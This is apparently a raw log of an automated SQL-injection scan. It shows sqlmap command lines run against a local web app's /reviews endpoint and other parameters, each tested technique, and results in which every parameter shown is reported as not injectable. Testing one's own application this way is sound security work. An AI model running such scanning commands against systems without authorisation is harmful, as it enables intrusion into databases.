[19:02:23] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)'
[19:02:23] [INFO] URI parameter '#1*' appears to be 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)' injectable 
it looks like the back-end DBMS is 'Microsoft SQL Server/Sybase'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
[19:02:23] [INFO] testing 'Generic inline queries'
[19:02:23] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[19:02:23] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[19:02:23] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
[19:02:23] [INFO] target URL appears to be UNION injectable with 6 columns
[19:02:24] [WARNING] if UNION based SQL injection is not detected, please consider and/or try to force the back-end DBMS (e.g. '--dbms=mysql') 
[19:02:24] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
[19:02:24] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
[19:02:24] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
[19:02:24] [INFO] testing 'Generic UNION query (random number) - 41 to 60 columns'
[19:02:24] [INFO] testing 'Generic UNION query (NULL) - 61 to 80 columns'
[19:02:25] [INFO] testing 'Generic UNION query (random number) - 61 to 80 columns'
[19:02:25] [INFO] testing 'Generic UNION query (NULL) - 81 to 100 columns'
[19:02:25] [INFO] testing 'Generic UNION query (random number) - 81 to 100 columns'
[19:02:25] [INFO] checking if the injection point on URI parameter '#1*' is a false positive
[19:02:25] [WARNING] false positive or unexploitable injection point detected
[19:02:25] [WARNING] URI parameter '#1*' does not seem to be injectable
other non-custom parameters found. Do you want to process them too? [Y/n/q] Y
[19:02:25] [INFO] testing if parameter 'User-Agent' is dynamic
[19:02:25] [WARNING] parameter 'User-Agent' does not appear to be dynamic
[19:02:25] [WARNING] heuristic (basic) test shows that parameter 'User-Agent' might not be injectable
[19:02:25] [INFO] testing for SQL injection on parameter 'User-Agent'
[19:02:25] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[19:02:26] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[19:02:26] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[19:02:27] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[19:02:27] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[19:02:27] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[19:02:27] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[19:02:28] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[19:02:28] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[19:02:28] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[19:02:28] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[19:02:28] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[19:02:28] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[19:02:28] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[19:02:28] [INFO] testing 'Generic inline queries'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
[19:02:28] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[19:02:29] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
[19:02:29] [WARNING] parameter 'User-Agent' does not seem to be injectable
[19:02:29] [INFO] testing if parameter 'Referer' is dynamic
[19:02:29] [WARNING] parameter 'Referer' does not appear to be dynamic
[19:02:29] [WARNING] heuristic (basic) test shows that parameter 'Referer' might not be injectable
[19:02:29] [INFO] testing for SQL injection on parameter 'Referer'
[19:02:29] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[19:02:30] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[19:02:31] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[19:02:31] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[19:02:31] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[19:02:32] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[19:02:32] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[19:02:32] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[19:02:32] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[19:02:32] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[19:02:32] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[19:02:32] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[19:02:32] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[19:02:32] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[19:02:33] [INFO] testing 'Generic inline queries'
[19:02:33] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[19:02:33] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
[19:02:34] [WARNING] parameter 'Referer' does not seem to be injectable
[19:02:34] [INFO] testing if parameter 'Host' is dynamic
[19:02:34] [WARNING] parameter 'Host' does not appear to be dynamic
[19:02:34] [WARNING] heuristic (basic) test shows that parameter 'Host' might not be injectable
[19:02:34] [INFO] testing for SQL injection on parameter 'Host'
[19:02:34] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[19:02:35] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[19:02:35] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[19:02:36] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[19:02:36] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[19:02:37] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[19:02:37] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[19:02:37] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[19:02:37] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[19:02:37] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[19:02:37] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[19:02:37] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[19:02:37] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[19:02:37] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[19:02:37] [INFO] testing 'Generic inline queries'
[19:02:37] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[19:02:38] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
[19:02:39] [WARNING] parameter 'Host' does not seem to be injectable
[19:02:39] [CRITICAL] all tested parameters do not appear to be injectable. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
[19:02:39] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 3455 times, 404 (Not Found) - 4 times

[*] ending @ 19:02:39 /2025-09-26/

2025-09-26 19:02:39,277 - WARNING - Could not parse DB names, but sqlmap output saved to attack-logs-dynamic\Get_orders_for_a_user_dbs.log
2025-09-26 19:02:39,278 - INFO - Executing command: 'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' --batch --flush-session -u http://localhost:5000/reviews -H 'Content-Type: application/json' --data '{"product_id": "1", "user_id": "1", "review": "test", "rating": "1"}'
2025-09-26 19:02:42,689 - INFO -         ___
2025-09-26 19:02:42,689 - INFO -        __H__
2025-09-26 19:02:42,689 - INFO -  ___ ___[.]_____ ___ ___  {1.9.9.4#dev}
2025-09-26 19:02:42,689 - INFO - |_ -| . [.]     | .'| . |
2025-09-26 19:02:42,689 - INFO - |___|_  [(]_|_|_|__,|  _|
2025-09-26 19:02:42,689 - INFO -       |_|V...       |_|   https://sqlmap.org
2025-09-26 19:02:42,689 - INFO - 
2025-09-26 19:02:42,721 - INFO - [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
2025-09-26 19:02:42,721 - INFO - 
2025-09-26 19:02:42,721 - INFO - [*] starting @ 19:02:42 /2025-09-26/
2025-09-26 19:02:42,721 - INFO - 
2025-09-26 19:02:45,099 - INFO - JSON data found in POST body. Do you want to process it? [Y/n/q] Y
2025-09-26 19:02:45,099 - INFO - [19:02:45] [INFO] flushing session file
2025-09-26 19:02:45,109 - INFO - [19:02:45] [INFO] testing connection to the target URL
2025-09-26 19:02:45,343 - INFO - [19:02:45] [INFO] checking if the target is protected by some kind of WAF/IPS
2025-09-26 19:02:45,438 - INFO - [19:02:45] [INFO] testing if the target URL content is stable
2025-09-26 19:02:45,705 - INFO - [19:02:45] [INFO] target URL content is stable
2025-09-26 19:02:45,706 - INFO - [19:02:45] [INFO] testing if (custom) POST parameter 'JSON product_id' is dynamic
2025-09-26 19:02:45,812 - INFO - [19:02:45] [WARNING] (custom) POST parameter 'JSON product_id' does not appear to be dynamic
2025-09-26 19:02:45,829 - INFO - [19:02:45] [WARNING] heuristic (basic) test shows that (custom) POST parameter 'JSON product_id' might not be injectable
2025-09-26 19:02:45,856 - INFO - [19:02:45] [INFO] testing for SQL injection on (custom) POST parameter 'JSON product_id'
2025-09-26 19:02:45,918 - INFO - [19:02:45] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
2025-09-26 19:02:46,165 - INFO - [19:02:46] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
2025-09-26 19:02:46,319 - INFO - [19:02:46] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
2025-09-26 19:02:46,375 - INFO - [19:02:46] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
2025-09-26 19:02:46,418 - INFO - [19:02:46] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
2025-09-26 19:02:46,550 - INFO - [19:02:46] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
2025-09-26 19:02:46,596 - INFO - [19:02:46] [INFO] testing 'Generic inline queries'
2025-09-26 19:02:46,670 - INFO - [19:02:46] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
2025-09-26 19:02:46,717 - INFO - [19:02:46] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
2025-09-26 19:02:46,758 - INFO - [19:02:46] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
2025-09-26 19:02:46,817 - INFO - [19:02:46] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
2025-09-26 19:02:46,869 - INFO - [19:02:46] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
2025-09-26 19:02:46,945 - INFO - [19:02:46] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
2025-09-26 19:02:47,003 - INFO - [19:02:47] [INFO] testing 'Oracle AND time-based blind'
2025-09-26 19:02:47,052 - INFO - it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
2025-09-26 19:02:47,052 - INFO - [19:02:47] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
2025-09-26 19:02:47,093 - INFO - [19:02:47] [WARNING] reflective value(s) found and filtering out
2025-09-26 19:02:47,115 - INFO - [19:02:47] [WARNING] (custom) POST parameter 'JSON product_id' does not seem to be injectable
2025-09-26 19:02:47,115 - INFO - [19:02:47] [INFO] testing if (custom) POST parameter 'JSON user_id' is dynamic
2025-09-26 19:02:48,159 - INFO - [19:02:48] [WARNING] (custom) POST parameter 'JSON user_id' does not appear to be dynamic
2025-09-26 19:02:48,185 - INFO - [19:02:48] [WARNING] heuristic (basic) test shows that (custom) POST parameter 'JSON user_id' might not be injectable
2025-09-26 19:02:48,201 - INFO - [19:02:48] [INFO] testing for SQL injection on (custom) POST parameter 'JSON user_id'
2025-09-26 19:02:48,273 - INFO - [19:02:48] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
2025-09-26 19:02:48,521 - INFO - [19:02:48] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
2025-09-26 19:02:48,684 - INFO - [19:02:48] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
2025-09-26 19:02:48,769 - INFO - [19:02:48] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
2025-09-26 19:02:48,819 - INFO - [19:02:48] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
2025-09-26 19:02:48,925 - INFO - [19:02:48] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
2025-09-26 19:02:48,990 - INFO - [19:02:48] [INFO] testing 'Generic inline queries'
2025-09-26 19:02:49,073 - INFO - [19:02:49] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
2025-09-26 19:02:49,124 - INFO - [19:02:49] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
2025-09-26 19:02:49,177 - INFO - [19:02:49] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
2025-09-26 19:02:49,231 - INFO - [19:02:49] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
2025-09-26 19:02:49,292 - INFO - [19:02:49] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
2025-09-26 19:02:49,339 - INFO - [19:02:49] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
2025-09-26 19:02:49,383 - INFO - [19:02:49] [INFO] testing 'Oracle AND time-based blind'
2025-09-26 19:02:49,438 - INFO - [19:02:49] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
2025-09-26 19:02:49,487 - INFO - [19:02:49] [WARNING] (custom) POST parameter 'JSON user_id' does not seem to be injectable
2025-09-26 19:02:49,487 - INFO - [19:02:49] [INFO] testing if (custom) POST parameter 'JSON review' is dynamic
2025-09-26 19:02:49,901 - INFO - [19:02:49] [WARNING] (custom) POST parameter 'JSON review' does not appear to be dynamic
2025-09-26 19:02:49,924 - INFO - [19:02:49] [WARNING] heuristic (basic) test shows that (custom) POST parameter 'JSON review' might not be injectable
2025-09-26 19:02:49,964 - INFO - [19:02:49] [INFO] testing for SQL injection on (custom) POST parameter 'JSON review'
2025-09-26 19:02:50,034 - INFO - [19:02:50] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
2025-09-26 19:02:50,827 - INFO - [19:02:50] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
2025-09-26 19:02:50,875 - INFO - [19:02:50] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
2025-09-26 19:02:51,204 - INFO - [19:02:51] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
2025-09-26 19:02:51,515 - INFO - [19:02:51] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
2025-09-26 19:02:51,891 - INFO - [19:02:51] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
2025-09-26 19:02:53,012 - INFO - [19:02:53] [INFO] testing 'Generic inline queries'
2025-09-26 19:02:53,040 - INFO - [19:02:53] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
2025-09-26 19:02:53,306 - INFO - [19:02:53] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
2025-09-26 19:02:53,343 - INFO - [19:02:53] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
2025-09-26 19:02:53,597 - INFO - [19:02:53] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
2025-09-26 19:02:53,993 - INFO - [19:02:53] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
2025-09-26 19:02:54,367 - INFO - [19:02:54] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
2025-09-26 19:02:54,449 - INFO - [19:02:54] [INFO] testing 'Oracle AND time-based blind'
2025-09-26 19:02:54,840 - INFO - [19:02:54] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
2025-09-26 19:02:56,412 - INFO - [19:02:56] [WARNING] (custom) POST parameter 'JSON review' does not seem to be injectable
2025-09-26 19:02:56,417 - INFO - [19:02:56] [INFO] testing if (custom) POST parameter 'JSON rating' is dynamic
2025-09-26 19:02:56,546 - INFO - [19:02:56] [WARNING] (custom) POST parameter 'JSON rating' does not appear to be dynamic
2025-09-26 19:02:56,557 - INFO - [19:02:56] [WARNING] heuristic (basic) test shows that (custom) POST parameter 'JSON rating' might not be injectable
2025-09-26 19:02:56,575 - INFO - [19:02:56] [INFO] testing for SQL injection on (custom) POST parameter 'JSON rating'
2025-09-26 19:02:56,639 - INFO - [19:02:56] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
2025-09-26 19:02:56,984 - INFO - [19:02:56] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
2025-09-26 19:02:57,256 - INFO - [19:02:57] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
2025-09-26 19:02:57,339 - INFO - [19:02:57] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
2025-09-26 19:02:57,402 - INFO - [19:02:57] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
2025-09-26 19:02:57,583 - INFO - [19:02:57] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
2025-09-26 19:02:57,665 - INFO - [19:02:57] [INFO] testing 'Generic inline queries'
2025-09-26 19:02:57,767 - INFO - [19:02:57] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
2025-09-26 19:02:57,826 - INFO - [19:02:57] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
2025-09-26 19:02:57,878 - INFO - [19:02:57] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
2025-09-26 19:02:57,929 - INFO - [19:02:57] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
2025-09-26 19:02:57,997 - INFO - [19:02:57] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
2025-09-26 19:02:58,048 - INFO - [19:02:58] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
2025-09-26 19:02:58,109 - INFO - [19:02:58] [INFO] testing 'Oracle AND time-based blind'
2025-09-26 19:02:58,170 - INFO - [19:02:58] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
2025-09-26 19:02:58,221 - INFO - [19:02:58] [WARNING] (custom) POST parameter 'JSON rating' does not seem to be injectable
2025-09-26 19:02:58,221 - INFO - [19:02:58] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
2025-09-26 19:02:58,225 - INFO - [19:02:58] [WARNING] HTTP error codes detected during run:
2025-09-26 19:02:58,225 - INFO - 500 (Internal Server Error) - 233 times
2025-09-26 19:02:58,225 - INFO - 
2025-09-26 19:02:58,225 - INFO - [*] ending @ 19:02:58 /2025-09-26/
2025-09-26 19:02:58,225 - INFO - 

-------------------- EXECUTING COMMAND --------------------
'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' --batch --flush-session -u http://localhost:5000/reviews -H 'Content-Type: application/json' --data '{"product_id": "1", "user_id": "1", "review": "test", "rating": "1"}'
--------------------------------------------------
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.9.9.4#dev}
|_ -| . [.]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:02:42 /2025-09-26/

JSON data found in POST body. Do you want to process it? [Y/n/q] Y
[19:02:45] [INFO] flushing session file
[19:02:45] [INFO] testing connection to the target URL
[19:02:45] [INFO] checking if the target is protected by some kind of WAF/IPS
[19:02:45] [INFO] testing if the target URL content is stable
[19:02:45] [INFO] target URL content is stable
[19:02:45] [INFO] testing if (custom) POST parameter 'JSON product_id' is dynamic
[19:02:45] [WARNING] (custom) POST parameter 'JSON product_id' does not appear to be dynamic
[19:02:45] [WARNING] heuristic (basic) test shows that (custom) POST parameter 'JSON product_id' might not be injectable
[19:02:45] [INFO] testing for SQL injection on (custom) POST parameter 'JSON product_id'
[19:02:45] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[19:02:46] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[19:02:46] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[19:02:46] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[19:02:46] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[19:02:46] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[19:02:46] [INFO] testing 'Generic inline queries'
[19:02:46] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[19:02:46] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[19:02:46] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[19:02:46] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[19:02:46] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[19:02:46] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[19:02:47] [INFO] testing 'Oracle AND time-based blind'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
[19:02:47] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[19:02:47] [WARNING] reflective value(s) found and filtering out
[19:02:47] [WARNING] (custom) POST parameter 'JSON product_id' does not seem to be injectable
[19:02:47] [INFO] testing if (custom) POST parameter 'JSON user_id' is dynamic
[19:02:48] [WARNING] (custom) POST parameter 'JSON user_id' does not appear to be dynamic
[19:02:48] [WARNING] heuristic (basic) test shows that (custom) POST parameter 'JSON user_id' might not be injectable
[19:02:48] [INFO] testing for SQL injection on (custom) POST parameter 'JSON user_id'
[19:02:48] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[19:02:48] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[19:02:48] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[19:02:48] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[19:02:48] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[19:02:48] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[19:02:48] [INFO] testing 'Generic inline queries'
[19:02:49] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[19:02:49] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[19:02:49] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[19:02:49] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[19:02:49] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[19:02:49] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[19:02:49] [INFO] testing 'Oracle AND time-based blind'
[19:02:49] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[19:02:49] [WARNING] (custom) POST parameter 'JSON user_id' does not seem to be injectable
[19:02:49] [INFO] testing if (custom) POST parameter 'JSON review' is dynamic
[19:02:49] [WARNING] (custom) POST parameter 'JSON review' does not appear to be dynamic
[19:02:49] [WARNING] heuristic (basic) test shows that (custom) POST parameter 'JSON review' might not be injectable
[19:02:49] [INFO] testing for SQL injection on (custom) POST parameter 'JSON review'
[19:02:50] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[19:02:50] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[19:02:50] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[19:02:51] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[19:02:51] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[19:02:51] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[19:02:53] [INFO] testing 'Generic inline queries'
[19:02:53] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[19:02:53] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[19:02:53] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[19:02:53] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[19:02:53] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[19:02:54] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[19:02:54] [INFO] testing 'Oracle AND time-based blind'
[19:02:54] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[19:02:56] [WARNING] (custom) POST parameter 'JSON review' does not seem to be injectable
[19:02:56] [INFO] testing if (custom) POST parameter 'JSON rating' is dynamic
[19:02:56] [WARNING] (custom) POST parameter 'JSON rating' does not appear to be dynamic
[19:02:56] [WARNING] heuristic (basic) test shows that (custom) POST parameter 'JSON rating' might not be injectable
[19:02:56] [INFO] testing for SQL injection on (custom) POST parameter 'JSON rating'
[19:02:56] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[19:02:56] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[19:02:57] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[19:02:57] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[19:02:57] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[19:02:57] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[19:02:57] [INFO] testing 'Generic inline queries'
[19:02:57] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[19:02:57] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[19:02:57] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[19:02:57] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[19:02:57] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[19:02:58] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[19:02:58] [INFO] testing 'Oracle AND time-based blind'
[19:02:58] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[19:02:58] [WARNING] (custom) POST parameter 'JSON rating' does not seem to be injectable
[19:02:58] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
[19:02:58] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 233 times

[*] ending @ 19:02:58 /2025-09-26/

2025-09-26 19:02:58,373 - INFO - Flushed sqlmap session for http://localhost:5000/reviews (log: attack-logs-dynamic\Add_a_review_for_a_product_flush.log)
2025-09-26 19:02:58,373 - INFO - Executing command: 'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' -u http://localhost:5000/reviews --output-dir 'attack-logs-dynamic\Add_a_review_for_a_product_sqlmap' --batch --level=5 --risk=3 --threads 5 -H 'Content-Type: application/json' --data '{"product_id": "1", "user_id": "1", "review": "test", "rating": "1"}' --technique BU
2025-09-26 19:03:01,667 - INFO -         ___
2025-09-26 19:03:01,667 - INFO -        __H__
2025-09-26 19:03:01,667 - INFO -  ___ ___[,]_____ ___ ___  {1.9.9.4#dev}
2025-09-26 19:03:01,667 - INFO - |_ -| . [(]     | .'| . |
2025-09-26 19:03:01,667 - INFO - |___|_  [(]_|_|_|__,|  _|
2025-09-26 19:03:01,667 - INFO -       |_|V...       |_|   https://sqlmap.org
2025-09-26 19:03:01,667 - INFO - 
2025-09-26 19:03:01,699 - INFO - [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
